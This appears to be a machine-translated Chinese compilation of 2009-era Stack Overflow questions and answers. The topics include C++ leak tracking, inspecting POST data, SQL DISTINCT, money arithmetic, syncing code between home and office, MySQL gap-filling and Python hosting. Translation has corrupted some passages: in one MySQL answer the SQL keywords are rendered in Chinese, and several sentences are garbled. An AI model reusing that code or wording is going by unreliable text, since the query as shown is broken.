在您的头文件中并在 C++ 源文件中的某处*定义*它（例如 a `main.cpp`）：

```
AllocList *allocList; 
```

这样，每个包含`stdafx.h`的编译单元都会知道外部变量，但它只定义在一个编译单元中。

根据您的进一步信息：

> 我试图关注[http://www.flipcode.com/archives/How_To_Find_Memory_Leaks.shtml](http://www.flipcode.com/archives/How_To_Find_Memory_Leaks.shtml)，我认为所有这些代码都应该放在 stdafx.h 中。还有其他选择吗，pax？

我的回应如下。

我不会把它们放在`stdafx.h`自己身上，因为我认为这对预编译的头文件使用了一些 MS 魔法。

制作一个单独的头文件`mymemory.h`并将您的函数原型放入其中，例如（请注意，这没有*body*）：

```
inline void * __cdecl operator new(
    unsigned int size,
    const char *file,
    int line); 
```

同样在该标题中，放置 , 等的其他原型`AddTrack()`，`DumpUnfreed()`以及`#define`,`typedef`和`extern`语句：

```
extern AllocList *allocList; 
```

然后，在一个新文件`mymemory.cpp`（其中也包含`#include "mymemory.h"`）中，将 的实际定义`allocList`与所有实际函数（不仅仅是原型）一起放入，并将该文件添加到您的项目中。

然后，`#include "mymemory.h"`在您需要跟踪内存的每个源文件中（可能是所有源文件）。因为头文件中没有定义，所以在链接期间您不会得到重复，并且因为声明在那里，您也不会得到未定义的引用。

请记住，这不会跟踪您未编译的代码（例如，第三方库）中的内存泄漏，但它应该让您了解自己的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T05:30:49.623

我试图关注这篇[文章](http://www.flipcode.com/archives/How_To_Find_Memory_Leaks.shtml)，我假设所有这些代码都应该放在 stdafx.h 中。任何其他替代方案pax？

# reverse-engineering - 如何检查正在发布的表单数据？

> ID：434528
> 
> 赞同：3
> 
> 时间：2009-01-12T05:19:31.703
> 
> 标签：reverse-engineering, sniffing, postdata

我正在对应用程序进行逆向工程，我需要在不查看表单源的情况下查看发布数据中的内容。是否有一个像样的应用程序/插件来查看发布的内容？

我正在寻找除数据包嗅探之外的其他东西。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-12T05:48:28.480

同样对于 Firefox，还有名为[HTTPfox](https://addons.mozilla.org/en-US/firefox/addon/6647)和[Tamperdata](https://addons.mozilla.org/en-US/firefox/addon/966)的插件，它们允许您使用 POST 数据做更多事情，然后是 firebug。我个人在我的工作计算机上拥有这三个。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-12T05:25:07.247

Internet Explorer 的提琴手。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2011-06-24T11:42:40.073

Charles - 网络调试代理应用

[去网站](http://www.charlesproxy.com/documentation/getting-started/)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-12T05:21:40.017

[Firebug](https://addons.mozilla.org/en-US/firefox/addon/1843)与 Firefox 结合使用。

* * *

## 回答 #5

> 赞同：-10
> 
> 时间：2009-01-12T05:48:00.227

```
<?php print_r($_POST);?> 
```

# sql - DISTINCT 有多慢？

> ID：434546
> 
> 赞同：1
> 
> 时间：2009-01-12T05:32:21.350
> 
> 标签：sql, tsql

我可以选择为数据库结构编写两种不同的格式：

```
Article
-------
ArticleID int FK

Article_Tags
------------
ArticleTagID int FK
ArticleID int FK
TagText varchar(50) 
```

或者

```
Article
-------
ArticleID int PK

Article_Tags
------------
ArticleTagID int PK
ArticleID int FK
TagText varchar(50) FK

Tag
---
TagText varchar(50) PK 
```

如果我想要数据库中所有标签的列表，我可以使用：

```
select distinct tagtext from article_tags 
```

或者：

```
select tagtext from tag 
```

第一种情况很简单。如果我正确索引它，也许它会加快速度。第二个有点困难，因为我必须不断删除没有连接的标签。想象一个相当大的系统，这会更好。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T05:47:17.547

无论哪种解决方案都能为您的应用程序带来最佳/最干净的设计，我都会选择。如果您需要将数据直接附加到标签，那么单独的表（即更规范的解决方案）将是正确的。

我会警告不要过分担心两个提议的解决方案的性能差异，如果索引，差异可能是微不足道的（两者都是相当常见的用例，可以使用标准数据库技术轻松优化）。根据性能在两个提供的选项之间做出决定听起来像是过早的优化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T05:40:10.913

选项 2 进行了一些修改。假设您将输入限制为标签表中包含的值，那么您就可以针对不同的目的执行两个不同的查询。

第一个查询将为您提供所有当前使用的标签的唯一列表。

第二个查询将为您提供所有可能使用的标签，包括尚未使用的标签。

您最好使用标签 ID 并在 tag 和 article_tags 表之间建立关系。这将使选项二更有效，因为索引只是一个整数而不是字符串。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T06:44:46.073

我会去

```
Article
-------
ArticleID int PK

Article_Tags
------------
ArticleTagID int PK
ArticleID int FK
TagId int FK

Tag
---
TagId int identity(1,1) PK
TagText varchar(50) 
```

真的没有理由从一开始就将其非规范化。（您的第一个和第二个版本未标准化）

将标签放在单独的表中很好，如果没有明确的声明，获取唯一标签会更干净。

如果应用了正确的索引，如果 3 个选项中的任何一个的性能几乎相同，则性能明智。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T06:58:49.273

从标题中回答基本问题：a`DISTINCT`通常意味着对数据进行排序。根据索引，查询的结构和返回的数据量可能是免费的（标签文本上的正确索引，，`ORDER BY tagtext`小返回集）或不是（缺少索引，订单无关，大量返回集）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-12T07:05:44.453

维护两个表的开销不太可能成为搞乱简单设计的合理权衡。

如果您真的很担心，那么两种方式都可以简单地测试它，但根据我丰富的经验，毫无疑问这是真的。

# java - 几乎等于 2s 补码或 BigDecimal 缩放

> ID：434548
> 
> 赞同：0
> 
> 时间：2009-01-12T05:34:39.397
> 
> 标签：java, types, floating-point

比较两个浮点值的更好方法是什么 - 使用 Epsilon 或带有缩放的 Big Decimal 比较？

例如，您的数据范围是 0.00 - 49,999.99？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T05:51:49.860

对于 0 到 50000 的 2 个十进制数字的数据范围，我会使用带有 epsilon 的内置类型。

这实际上取决于您对数字的处理方式。如果您只是加或减，则必须处理**大量**数字才能使浮点误差累积到您的数据范围内的 0.01。

让我解释一下：假设您的浮点数有 17 位有效数字。这意味着您对高达 49999.99 的数字的错误可能约为 0.000000000001。您必须添加大约 100 亿个数字才能使累积误差达到 1 美分。乘法和除法会更快地累积该错误，但仍需要相当长的时间。

如果您不了解它是如何工作的（并且性能不是应用程序中的全部和最终目的），请使用 BigDecimal 以确保安全。内置类型应该快得多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T07:52:39.117

此外，在处理货币时，没有理由不能简单地存储表示美分而不是美元的整数，以便有效地获得定点表示。*例如*$4.09 被存储为 409 等等。（您也可以选择存储十分之一分，*即*4090 或其他一些恒定的小数精度。）您将能够无限次地进行加减运算而不会丢失精度。

对于利息等计算，使用浮点数执行计算，然后在存储之前简单地四舍五入到必要的精度。利息计算本身将具有必要的精度，并且您将始终将每个期间的小数位数四舍五入，这通常是您在财务计算中想要的（我从未见过真正想要跟踪 $0.00001 的机构从一个支付期到下一个支付期——出于法律原因，他们会将账簿四舍五入到某个指定的精度。）

一个普通的已签名**int**存储美分最多可让您代表 $21,474,836.47 。您可以使用**long**来存储 $92,233,720,368,547,758.07。要处理超过千万亿的货币单位（以 Zim 美元表示美国预算？），请使用 BigDecimal。

您可以在此处了解有关浮点比较的更多信息： [每位计算机科学家应了解的浮点运算知识](http://www.physics.ohio-state.edu/~dws/grouplinks/floating_point_math.pdf)

# c# - 有没有办法在 Windows Mobile 中检测所有用户生成的事件（单击、按键、...）？

> ID：434557
> 
> 赞同：1
> 
> 时间：2009-01-12T05:47:29.993
> 
> 标签：c#, compact-framework, mobile

我将使用 CompactFramework/C# 为 Windows Mobile 设备开发一些东西。我想知道是否有一些可用的事件可以在设备的上下文中捕获任何用户驱动的事件（点击、按键、...）。当然，我可以在我的任何点击事件处理程序中添加一些检测代码，但我假设有数百个。

那么是否有一些与事件或 Windows 移动 API 相关的调用可以帮助我？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T14:41:10.230

[您可以通过挂钩](http://msdn.microsoft.com/en-us/library/ms644990.aspx)捕获设备范围内的键盘事件（请注意，它们不受官方支持，因此可能会在未来的任何版本中消失 - 尽管只要我一直在使用 CE，它们就一直存在，这已经*很长时间*了）。如果您需要预先构建的内容或代码，我们实际上在最新版本[的 SDF中添加了](http://smartdeviceframework.com)[键盘挂钩支持。](http://opennetcf.com/library/sdf/html/42824e9f-8a04-8cf8-ecf4-65429555cab9.htm)然而，鼠标事件在 CE 中是不可挂钩的，除非您编写新的触摸面板驱动程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T11:44:41.817

[您可以使用Microsoft.WindowsCE.Form.MessageWindows](http://msdn.microsoft.com/en-us/library/microsoft.windowsce.forms.messagewindow.aspx)类拦截按键。无法拦截点击事件。

# version-control - 在家工作时使用什么策略来同步代码

> ID：434569
> 
> 赞同：11
> 
> 时间：2009-01-12T05:58:57.897
> 
> 标签：version-control, synchronization

在我的工作**中，我目前在 Virtual Machine 中拥有我的开发环境**。当我需要在家工作时，我会将我的虚拟机和我需要的任何数据库复制到笔记本电脑驱动器大小的外部 USB 驱动器上。大约 10 分钟的复制后，我将驱动器放在口袋里回家，将 VM 和数据库复制回我的个人计算机上，然后我就可以开始工作了。我按照相同的步骤将工作带回。

因此**，如果我计算等待文件完成复制以便我将工作带回家并再次带回来所花费的总时间，大约需要 40 分钟！**我确实可以在家中与我的工作建立 VPN 连接（前提是两个站点的 Internet 都已启动）和不错的 Internet 速度（8 mbps 向下/？向上），但我发现远程桌面进入我的工作机器太慢了，以至于我想工作直接在我的虚拟机上。

因此，在查看我有哪些其他选项或如何改进现有选项**时，我对您使用或建议在家工作并保持代码/环境同步的策略感兴趣。**

编辑：我更喜欢一个选项，在我离开工作之前我不必将我的更改提交到版本控制中 - 因为我喜欢在我的提交中做出有意义的描述性评论，提交将比仅仅将我的 VM 复制到便携式设备上花费更长的时间驾驶！大声笑另外，我更喜欢我的开发环境也保持同步的解决方案。话虽如此，我仍然对您自己的解决方案非常感兴趣，即使它们并没有完全按照我的意愿解决我的问题。:)

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-01-12T06:08:18.377

分布式/去中心化版本控制系统解决方案将满足您的需求，Git、Bazaar、Mercurial、darcs……您有很多选择。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-01-12T06:02:06.237

使用版本控制软件，如 SVN、SourceOffSite 等。您只需签入所有更改并在需要同步时获取最新更改。

或者您可以使用 Windows Live 同步 -> [https://sync.live.com/foldersharetolivesync.aspx](https://sync.live.com/foldersharetolivesync.aspx)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-01-12T08:31:35.403

没有人推荐rsync吗？使用 rsync 客户端发送文件之间的差异。您可以应用这些差异，从而使您的文件保持最新。对于最小的文件传输，这可能是最好的主意。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-12T06:43:34.217

我只是使用一个外部便携式笔记本驱动器来完成我所有的工作。我所有的电脑都将它设置为相同的驱动器号。所以不要复制任何东西..我没有尝试过以这种方式运行虚拟机，但我看不出有任何理由它不应该简单地工作。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-12T06:47:29.157

我使用保管箱。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-03-27T15:14:47.740

这是我使用的解决方案。

1.  在办公室网络和笔记本电脑之间设置 VPN。
2.  安装 VisualSVN 服务器
3.  加载 SCC 中的所有项目。

在办公室时，我签出一个项目，进行工作，然后签入。在家或在世界各地时，我通过 VPN 连接到办公室，签出我的项目，做我的事情，然后签入。通过 VPN连接我还可以 RDP 到我的开发盒和/或服务器。

希望这可以帮助。祝你好运！

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-01-12T06:33:48.823

我们使用 Citrix，然后我在工作中与我的 PC 进行远程桌面连接。它不是世界上最快的解决方案，但它确实消除了使两个或多个工作站保持最新的问题。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-01-12T08:09:50.190

编写程序，它将通过互联网同步您的所有数据，然后关闭您的计算机，所以在一天结束时您启动它，然后回家，当您回家时，所有数据都已经存在

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-01-12T11:40:55.397

只需在家里设置一个 SVN 服务器，转发您的路由器端口，然后继续您的生活。rsync 也是一个很好、快速的解决方案。请记住通过 SSH 使用它。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2009-01-12T08:37:50.400

我们与分布式团队合作，因此每个人都能轻松安全地访问代码存储库至关重要。为此，我们使用 SVN over ssl/https。它运行良好、可靠且安全。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2009-01-12T06:33:56.547

我要么远程连接到办公室的 SVN，要么连接到我的开发人员或桌面计算机中的 VPN 和远程桌面，然后继续工作。我很少同步任何文件，但是当我这样做时，通常是使用 DropBox （尽管你不能真正用大文件这样做）。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-01-12T06:42:35.763

您还没有指定操作系统和虚拟化系统，但是如果您正在使用可以挂载的 VM 映像，例如 Linux 上的 XEN，那么您可以挂载映像并通过 rsync 同步它。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2009-01-12T06:47:28.860

我连接到办公室网络并下载最新版本的 svn 使用 Dev mysql 服务器，所以我就像办公室网络中的另一台计算机

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2009-01-12T07:40:43.120

我想复制所花费的大部分时间都涉及数据库。那正确吗？如果是这样，您能否不简单地使用您的 VPN 连接在家中连接到您的工作数据库？

你仍然会复制你的源文件（或者像其他人建议的那样使用源代码控制系统），但这只需要一小部分时间。

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2009-01-12T08:24:55.450

如果您只需要来自工作计算机的虚拟机，那么您可以挂载一个远程目录（使用 nfs 或 smb），您的虚拟机文件存储在哪里，并从那里运行该虚拟机。这应该比使用远程桌面更快。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2009-07-29T18:13:49.763

Dropbox 和 Microsoft 的 Live Sync 是已经提到的不错的选择。我个人最喜欢的是同样来自 Microsoft的[Live Mesh 。](https://www.mesh.com/welcome/default.aspx "实时网格")在我看来，将其置于其他两个之上的一个重要功能是能够指定哪些文件夹在哪些计算机上同步，以及文件夹所在的位置。因此，例如，我在我的工作机器和我家中的开发盒之间同步我的 Visual Studio 2005/Projects 文件夹，我在我的边演出 VM 和我的家庭开发盒之间同步 Visual Studio 2008/Projects。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2009-03-27T15:08:16.913

我也使用 DropBox，这是关键，因为保持简单很重要。

如果您可以拥有某种类型的远程桌面功能通常会更好，因为这将允许您使用标准工作站配置，并且允许与网络资源（数据库服务器、工作流等业务服务器等）的一致连接。

在我看来，对于某些任务来说，离线工作是可以的，但总的来说，连接到其他资源的系统存在障碍（除非你打算将这些资源移动到你的 home box）。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2009-03-27T15:28:55.977

这对我来说也是个问题。所以，公司给我买了一台笔记本电脑，我在家或其他任何地方都可以在上面工作。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2009-03-27T15:39:48.803

我有一个设置，其中一台机器上的文件夹同步到另一台机器上的文件夹。对一台机器上的内容的任何更改也会在一分钟内在另一台机器上进行。因此，您可以同步工作文件的顶级文件夹，然后同步到您的家用计算机。我喜欢的是同步是完全透明的。就用户体验而言，我只是在使用文件系统。没有可与之交互的外部应用程序。

我使用Microsoft 的[Live Sync](https://www.foldershare.com/) Live Sync。您需要创建一个 Windows Live ID 才能使用此系统。它适用于 windows 和 mac。

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2009-01-12T06:31:06.567

我有一个类似的问题。但幸运的是，我们配置了源控制服务器 (TFS)，因此我只能从存储在外部驱动器上的本地虚拟机中工作，而不是在需要时将所需文件签入 TFS。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2009-01-12T11:12:09.760

根据您使用的 VM 软件，为什么不设置 2 个不同的 VM 磁盘，将用户配置文件/开发文件保存在一个磁盘上，将操作系统和其他很少更改的程序保存在另一个磁盘上。

这样，当您安装新的东西时，您可能只需复制较大的磁盘映像，最终只复制包含您工作的单个虚拟磁盘即可。

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2009-08-31T23:32:54.913

我有一个装有我所有开发软件的 macbook；当我上班时，我以目标火线模式启动它，并将它插入我的工作 macpro 与快速处理器、局域网连接、大显示器等。这样我永远不必离开我的用户文件夹，但我可以访问所有工作中可用的软件和硬件。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2010-03-30T12:33:43.350

为什么不直接使用版本控制？DVCS？在这里找到一个针对 Windows 用户的 DVCS 教程（非常简单） [http://codicesoftware.blogspot.com/2010/03/distributed-development-for-windows.html](http://codicesoftware.blogspot.com/2010/03/distributed-development-for-windows.html)

# sql - MySQL Query - 使用 group-by 时获取丢失的记录

> ID：434571
> 
> 赞同：0
> 
> 时间：2009-01-12T05:59:28.957
> 
> 标签：sql, mysql, group-by

我有一个查询：

> ```
> select score, count(1) as 'NumStudents' from testresults where testid = 'mytestid'
> group by score order by score 
> ```

其中 testresults 表包含学生在测试中的表现。假设测试的最高分数为 10，示例结果如下所示。

> **分数，NumStudents**
> 
> 0 10
> 1 20
> 2 12
> 3 5
> 5 34
> ..
> 10 23

如您所见，此查询不返回任何没有学生得分的记录。例如。没有人在测试中得分 4/10，并且查询输出中没有 score = 4 的记录。

我想更改查询，以便我可以获取这些缺失记录，其中 0 作为 NumStudents 字段的值。这样我的最终输出将有 max + 1 条记录，每个可能的分数都有一条。

有任何想法吗 ？

**编辑：**

数据库包含几个测试，测试的最高分数是测试定义的一部分。所以有一个新的表来存储所有可能的分数是不可行的。从某种意义上说，每当我创建一个新的最高分数的新测试时，我需要确保新表也应该更改为包含这些分数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T06:07:52.183

SQL 擅长处理数据库中的数据值集，但不擅长处理数据库中*不*存在的数据值集。

最好的解决方法是保留一个小表来存储您需要覆盖的值：

```
CREATE TABLE ScoreValues (score int);
INSERT INTO ScoreValues (score) 
  VALUES (0), (1), (2), (3), (4), (5), (6), (7), (8), (9), (10); 
```

鉴于您在另一个表中定义了测试的最大分数的评论，您可以通过以下方式加入该表，只要`ScoreValues`确保值至少与最大测试的最大分数一样高或更高：

```
SELECT v.score, COUNT(tr.score) AS 'NumStudents'
FROM ScoreValues v 
  JOIN Tests t ON (v.score <= t.maxmarks)
  LEFT OUTER JOIN TestResults tr ON (v.score = tr.score AND t.testid = tr.testid)
WHERE t.testid = 'mytestid'
GROUP BY v.score; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T06:03:54.500

最明显的方法是创建一个名为“Scores”的表并将您的表左外部连接到它。

SELECT s.score, COUNT(1) AS scoreCount
FROM score AS s
LEFT OUTER JOIN testScores AS ts
ON s.score = ts.score
GROUP BY s.score

如果您不想创建表，可以使用

选择
1 作为分数，SUM(CASE WHEN ts.score = 1 THEN 1 ELSE 0 END) 作为 scoreCount，
2 作为分数，SUM(CASE WHEN ts.score = 2 THEN 1 ELSE 0 END) 作为 scoreCount，
3 作为分数，SUM (CASE WHEN ts.score = 3 THEN 1 ELSE 0 END) AS scoreCount,
4 as score, SUM(CASE WHEN ts.score = 4 THEN 1 ELSE 0 END) AS scoreCount,
... 10 as score, SUM(CASE WHEN ts.score = 10 THEN 1 ELSE 0 END) AS scoreCount
FROM testScores AS ts

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T07:48:19.347

MySQL 是否支持 set-returning 函数？PostgreSQL 的最新版本有一个函数，`generate_series(start, stop)`它`start`在第一行，`start+1`第二行，依此类推，直到`stop`第`stop`th 行。这样做的好处是您可以将此函数放在`FROM`子句中的子选择中，然后加入它，而不是像 le dorfier 和 Bill Karwin 建议的那样创建和填充表并加入表。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T13:38:57.967

作为一个心理练习，我想出了这个在 MySQL 中生成一个序列。只要正方形框上所有数据库中的表数小于序列的总长度，它就可以工作。不过，我不建议将其用于生产；）

```
SELECT @n:=@n+1 as n from (select @n:=-1) x, Information_Schema.Tables y, Information_Schema.Tables WHERE @n<20; /* sequence from 0 to 20 inclusive */ 
```

# c# - 用于 C# 的流式视频库

> ID：434575
> 
> 赞同：4
> 
> 时间：2009-01-12T06:03:02.693
> 
> 标签：c#, flv, video-encoding, video-library

我正在寻找将流式视频添加到用 ASP.NET/C# 编写的社交网站的选项。我在 Flash 方面也有丰富的经验，所以我很喜欢使用 FLV 播放器，但如果有合适的库可用，我肯定会选择 Silverlight。

*   该库需要能够以网络格式对用户上传的视频进行编码。
*   我想播放将基于 Flash 或 Silverlight。
*   它需要创建视频的缩略图。
*   它需要有用于流式传输视频的服务器软件或有一些第 3 方这样做的方式。
*   我不介意为软件支付许可费，因此它不必是开源或免费的。
*   许可证必须允许在商业网站上使用。

我发现最接近的是[MediaSoft 的产品](http://www.mediasoftpro.com/)。但在开始搜索之前我从未听说过这家公司，也不知道有人在使用他们的软件。他们似乎在使用 FFMPEG 来执行编码，我听说这会为商业网站带来法律问题。虽然我自己对 FFMPEG 的许可不是很熟悉，所以如果我听错了，请纠正我。

有人用过MediaSoft吗？您使用过的其他任何运行良好的视频库？您是否刚刚编写了自己的视频编码和服务库？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T06:57:39.337

不确定 Silverlight，但 Flash 将呈现 h.264 和 FLV 视频。FFMPEG 可以通过[liblame 转换为 FLV](http://blog.gwikzone.org/2006/09/25/flv-encoding-with-ffmpeg)和[x264 转换为 h.264](http://rob.opendot.cl/index.php/useful-stuff/ffmpeg-x264-encoding-guide/)。它还可以[生成缩略图](http://blog.prashanthellina.com/2008/03/29/creating-video-thumbnails-using-ffmpeg/)。

它和相应的模块在 LGPL/GPL 下获得许可，这意味着您可以使用 FFMPEG 不受限制地生成视频/缩略图，只要您拥有正在转码的原始电影的权利。GPL/LGPL 许可限制仅适用于 FFMPEG 代码/二进制文件，在您决定将这些二进制文件分发给其他人之前，这无关紧要。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T07:00:39.580

除了上面的答案，你可以把 red5 看成一个流式解决方案 [http://osflash.org/red5](http://osflash.org/red5)

# ado.net - 如何将 DataSet.WriteXML 输出限制为类型化列？

> ID：434576
> 
> 赞同：1
> 
> 时间：2009-01-12T06:03:53.410
> 
> 标签：ado.net, dataset, strongly-typed-dataset

我正在尝试使用 ADO.NET 数据集存储经过轻微过滤的数据库副本以供离线参考。有些专栏我不需要*随身*携带。到目前为止，看起来我的选择是：

*   忍受列
*   `SELECT`对我为 DataSet 行的方式变得难以维护
*   破解 XML 输出以删除列

我已经删除了 DataSet 设计器中的列条目。`WriteXMl`仍然输出它们，令我沮丧。**如果有办法将`WriteXml`' 的输出限制为键入的行，我很想听听。**

我试图用仔细的`SELECT`语句过滤掉这些列，但最终得到了一个`ConstraintException`我无法解决的问题。替换一个表的查询就可以`SELECT *`了。我怀疑如果有足够的时间我可以解决异常。我还怀疑随着我们发展模式，它可能会再次出现。我不想把这样的维护问题交给我的继任者。

总而言之，我认为过滤 XML 输出是最简单的。我需要对其进行压缩、存储，然后（稍后）加载、解压缩并将其读回 DataSet。过滤 XML 只是又一步——而且更好的是，只需要每周左右进行一次。

我可以改变`DataSet`的行为吗？我应该过滤 XML 吗？有没有一些非常简单的方法我可以查询很多，但不完全是，所有内容都不会遇到`ConstraintException`？还是我的方法完全错误？非常感谢您的建议。

**更新：**事实证明我`ConstraintException`出于一个简单的原因：我忘记从一个 DataTable 中删除一个强类型列。这是不允许的`NULL`。当我选择除该列*之外*的所有列时，值为`NULL`, 和……而且，是的，这非常令人尴尬，非常感谢您的提问。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-12T06:14:43.170

这很容易**`Table.Columns.Remove("UnwantedColumnName")`。**我从 [Mehrdad 对另一个问题的简洁回答中](https://stackoverflow.com/questions/431050/c-reflection-getting-the-fields-of-a-datarow-from-a-typed-dataset#431058)得到了线索。`Table.Columns`当结果证明是可塑的时，我很高兴。

# python - 对于 Python 支持，从哪家公司获得托管服务最好？

> ID：434580
> 
> 赞同：14
> 
> 时间：2009-01-12T06:07:39.673
> 
> 标签：python, web-hosting, wsgi

我希望能够运行 WSGI 应用程序，但我当前的托管限制了它。有人知道可以满足我要求的公司吗？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2009-01-12T06:18:24.003

我的自动响应是[WebFaction](http://www.webfaction.com/)。

我没有亲自主持过他们，但他们主要是面向 Python 的（例如，由编写 CherryPy 的人创立，据我所知，他们是第一个推出[Python 3.0 支持](http://blog.webfaction.com/python-3-0-is-here)的人）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-12T07:23:17.087

我是[Slicehost](http://www.slicehost.com/)的忠实粉丝——您可以获得对虚拟服务器的 root 访问权限，该虚拟服务器需要大约 2 分钟才能从库存操作系统映像安装。对我来说已经足够的 256m 切片是 20 美元/月——它比保持一个旧盒子插电便宜，而且易于备份。很容易推荐。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-01-14T14:04:19.193

[用于PythonAnywhere](http://www.pythonanywhere.com)的Plug plug，这是我们在这个领域的适度产品。

我们为基本的 Web 应用程序提供免费托管，为流行的框架（如 Django、Flask、Web2py 等）提供一键式配置。包括 MySql，您还可以获得全套基于浏览器的开发工具，如编辑器和控制台......

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T19:58:17.000

我多年来一直在使用[WebFaction](http://www.webfaction.com/)，并且对这项服务非常满意。它们不仅面向 python。您应该能够在共享主机的限制范围内运行任何东西（当然，除非您有专用服务器）。

不过，它们可能不是最便宜的托管服务。我不知道价格。但我仍然清楚地记得我以前的托管服务提供商一周无法访问（不是他们的服务器，我是指人）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T06:23:54.383

我对 Dreamhost 非常满意，当然还有 Google AppEngine。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-12T11:44:28.963

Google App 引擎和 OpenHosting.com

拥有 OpenHosting 的虚拟服务器，它们的支持速度超快，并且正常运行时间非常长。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2011-08-22T10:24:18.077

查看[http://pythonplugged.com/](http://pythonplugged.com/)

他们正在尝试使用各种技术（CGI、FCGI、mod_python、mod_wsgi 等）收集有关 Python 托管服务提供商的信息

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-06-20T15:36:44.290

我建议你看看[http://www.python-cloud.com](http://www.python-cloud.com)

这个 PaaS 平台可以根据您的流量自动扩展和缩减您的应用程序。如果您想要垂直、水平或两种类型的可扩展性，您还可以进行精细定制。这种扩展的结果是您随用随付：您只需为实际消费而不是潜在消费付费。

通过 git 部署。

非 AWS，托管在第 4 层以上的数据中心。

免费试用 ;）

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2014-03-13T03:32:24.173

我使用 AWS 微型服务器，免费 1 年，之后您可以获得 3 年的保留期，费用约为 75 美元/年 :) 微型服务器只有 20MB/秒的吞吐量、~600MB 的内存和较慢的 CPU。我在我的网站上运行了一些夹层站点，看起来还不错。

# java - 使用java代码退出批处理文件

> ID：434581
> 
> 赞同：1
> 
> 时间：2009-01-12T06:07:48.860
> 
> 标签：java, windows

我有这样的示例代码。

```
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author padmaja
 */

import java.io.*;
class Test{
  public static void main(String arg[]){
    try{
      String command = "cmd /C start C:/excel.bat";
      Runtime rt = Runtime.getRuntime();
      Process pr = rt.exec(command);  
    }catch (IOException e) {
      e.printStackTrace();
    }
  }
} 
```

我正在使用上面的代码打开 excel 表。

问题是如果使用线程每 15 分钟打开一次 excel 表，则会显示多个 excel 表。我想从上面的代码本身关闭批处理文件的运行。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T06:41:40.353

打开 Excel 工作表后，最终用户将与之交互，对吗？你怎么知道可以关闭它？如果您只是为某些在加载时运行的宏启动 Excel，您可能能够退出该宏本身。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T07:15:45.010

在我的项目中，我们有同样的问题。

您可以编写一个 DLL，它可以根据需要打开和关闭已启动的进程。在 C++ 中，您可以处理您描述的过程。您将获得一个进程 ID，您可以在其中识别正在运行的进程。据我所知，您只能终止一个进程，而不能通过要求用户关闭窗口来优雅地终止。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T06:27:02.333

一种选择是使用 taskkill 命令 ( [http://technet.microsoft.com/en-us/library/bb491009.aspx](http://technet.microsoft.com/en-us/library/bb491009.aspx) ) 来终止进程。当然，这只会终止进程，因此您将无法进行任何清理/保存等操作。

# python - 在 Python 中从离散像素值绘制图像的最快方法是什么？

> ID：434583
> 
> 赞同：48
> 
> 时间：2009-01-12T06:08:12.917
> 
> 标签：python, image, python-imaging-library

我希望根据计算的像素值绘制图像，作为可视化某些数据的一种方式。本质上，我希望获取一个二维矩阵的颜色三元组并渲染它。

请注意，这不是图像处理，因为我没有转换现有图像，也没有进行任何形式的整体图像转换，它也不是矢量图，因为我正在渲染的图像没有预先确定的结构-我可能会一次产生一个像素的无定形颜色斑点。

我现在需要渲染大约 1kx1k 像素的图像，但一些可扩展的东西会很有用。最终目标格式是 PNG 或任何其他无损格式。

我目前一直在通过 ImageDraw 的 draw.point 使用 PIL，我想知道，鉴于我需要的非常具体和相对基本的功能，是否有更快的库可用？

* * *

## 回答 #1

> 赞同：38
> 
